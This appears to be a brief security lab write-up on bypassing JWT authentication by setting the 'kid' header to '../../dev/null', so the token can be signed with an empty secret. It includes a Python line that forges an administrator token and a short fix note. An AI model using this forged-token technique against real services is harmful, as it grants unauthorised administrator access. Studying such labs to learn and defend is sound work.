# Lab 6 — JWT Auth Bypass via kid Path Traversal (PRACTITIONER)

## Attack
Set `kid=../../dev/null` → server reads empty file → sign with empty secret `""`.

## Token
```python
jwt.encode({"sub":"administrator"}, "", algorithm="HS256",
           headers={"kid":"../../dev/null"})
```

## Fix
kid resolved via in-memory Map — no file path construction ever.
